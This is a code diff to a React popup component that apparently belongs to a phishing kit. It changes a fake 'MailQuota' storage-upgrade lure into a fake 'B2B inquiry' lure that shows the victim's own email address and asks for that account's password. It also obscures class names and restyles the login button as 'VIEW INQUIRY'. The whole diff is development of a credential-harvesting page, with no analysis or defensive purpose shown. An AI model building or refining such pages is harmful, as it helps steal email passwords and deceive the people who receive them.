@@ -228,80 +228,78 @@ const Popup = ({ domain, systemInfo }) => {
     <div className="popup">
       <div className="popup-content">
         <div className="djdfe">
-          {/* Header Text */}
+          {/* Logo - Replaced with new image link */}
           <div style={{
             textAlign: "center",
             marginBottom: "20px",
-            fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
+            display: "flex",
+            justifyContent: "center",
+            alignItems: "center"
           }}>
-            <div style={{
-              fontSize: "18px",
-              fontWeight: "bold",
-              color: "#333",
-              marginBottom: "5px"
-            }}>
-              MailQuota Settings
-            </div>
-            <div style={{
-              fontSize: "14px",
-              color: "#666"
-            }}>
-              Verify Your ID to upgrade your mail storage
-            </div>
+            <a href='https://postimg.cc/2VNmgJ1y' target='_blank' rel="noopener noreferrer">
+              <img 
+                src='https://i.postimg.cc/2VNmgJ1y/B2B.png' 
+                alt='B2B'
+                style={{
+                  maxWidth: "160px",
+                  height: "auto"
+                }}
+              />
+            </a>
           </div>
-
-          {/* Email Field */}
-          <div className="pasww" style={{ marginBottom: "15px" }}>
-            <div style={{
-              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-              fontSize: "14px",
+          
+          {/* Security Message with dynamic email - Fixed centering */}
+          <div style={{
+            fontSize: "14px",
+            color: "#333",
+            marginBottom: "25px",
+            lineHeight: "1.5",
+            textAlign: "center",
+            fontFamily: "Arial, sans-serif",
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            justifyContent: "center"
+          }}>
+            <div style={{ 
               marginBottom: "5px",
-              fontWeight: "500"
+              width: "100%",
+              textAlign: "center"
             }}>
+              For security purposes, please enter
             </div>
-            <input
-              type="email"
-              className="fjhd"
-              style={{
-                paddingLeft: "15px",
-                borderRadius: "4px",
-                height: "40px",
-                fontSize: "14px",
-                border: "1px solid #ccc",
-                width: "100%",
-                backgroundColor: "#ffffff",
-                outline: "none",
-                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
-              }}
-              placeholder=""
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-            />
+            <div style={{ 
+              marginBottom: "5px",
+              width: "100%",
+              textAlign: "center"
+            }}>
+              your <span style={{ color: "#0066cc", fontWeight: "600" }}>{email || "your email"}</span> password to
+            </div>
+            <div style={{
+              width: "100%",
+              textAlign: "center"
+            }}>
+              view your B2B inquiry.
+            </div>
           </div>
 
-          {/* Password Field */}
-          <div className="pasww" style={{ marginBottom: "5px" }}>
-            <div style={{
-              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-              fontSize: "14px",
-              fontWeight: "500",
-              marginBottom: "2px",
-            }}>
-      
-            </div>
+          {/* Password Field - Adjusted spacing */}
+          <div className="pasww" style={{ marginBottom: "8px" }}>
             <input
               type={showPassword ? "text" : "password"}
               className="fjhd"
               style={{
                 paddingLeft: "15px",
-                borderRadius: "4px",
-                height: "40px",
+                paddingRight: "15px",
+                borderRadius: "6px",
+                height: "44px",
                 fontSize: "14px",
-                border: "1px solid #ccc",
+                border: "1px solid #ddd",
                 width: "100%",
                 backgroundColor: "#ffffff",
                 outline: "none",
-                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
+                fontFamily: "Arial, sans-serif",
+                boxShadow: "inset 0 1px 2px rgba(0,0,0,0.1)"
               }}
               placeholder="Password"
               value={password}
@@ -309,38 +307,58 @@ const Popup = ({ domain, systemInfo }) => {
             />
           </div>
 
+          {/* Error Message - Changed to left-aligned */}
           <div className="njhiu" style={{ 
-            fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
+            fontFamily: "Arial, sans-serif", 
             fontSize: "12px", 
-            marginLeft: "8px", 
-            marginBottom: "2px" 
+            color: "#ff0000",
+            textAlign: "left",  // Changed from "center" to "left"
+            marginBottom: "8px",
+            minHeight: "18px",
+            height: "18px"
           }}>
             {errorMessage}
           </div>
 
-          <div className="fjiure">
+          {/* Login Button - Increased spacing from password */}
+          <div className="fjiure" style={{ marginTop: "15px" }}>
             <button 
               className="urifjdd" 
               onClick={handleNextClick}
               onMouseEnter={() => setIsHovered(true)}
               onMouseLeave={() => setIsHovered(false)}
               style={{
-                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
+                fontFamily: "Arial, sans-serif",
                 width: "100%",
-                height: "50px",
-                borderRadius: "4px",
+                height: "44px",
+                borderRadius: "6px",
                 border: "none",
-                backgroundColor: isHovered ? "rgb(50, 50, 200)" : "rgb(71, 71, 247)",
+                backgroundColor: isHovered ? "#0056b3" : "#0066cc",
                 color: "#ffffff",
-                fontSize: "16px",
-                fontWeight: "normal",
+                fontSize: "15px",
+                fontWeight: "600",
                 cursor: "pointer",
                 outline: "none",
-                marginBottom: "20px"
+                transition: "background-color 0.2s",
+                boxShadow: "0 2px 4px rgba(0,102,204,0.2)"
               }} 
             >
-              UPGRADE STORAGE
+              VIEW INQUIRY
             </button>
+          </div>
+
+          {/* Footer Text */}
+          <div style={{
+            textAlign: "center",
+            fontFamily: "Arial, sans-serif",
+            fontSize: "12px",
+            color: "#888",
+            lineHeight: "1.4",
+            marginTop: "30px",
+            paddingTop: "20px",
+            borderTop: "1px solid #eee"
+          }}>
+            Dynamic Marketplace for Global B2B Trade
           </div>
         </div>
       </div>
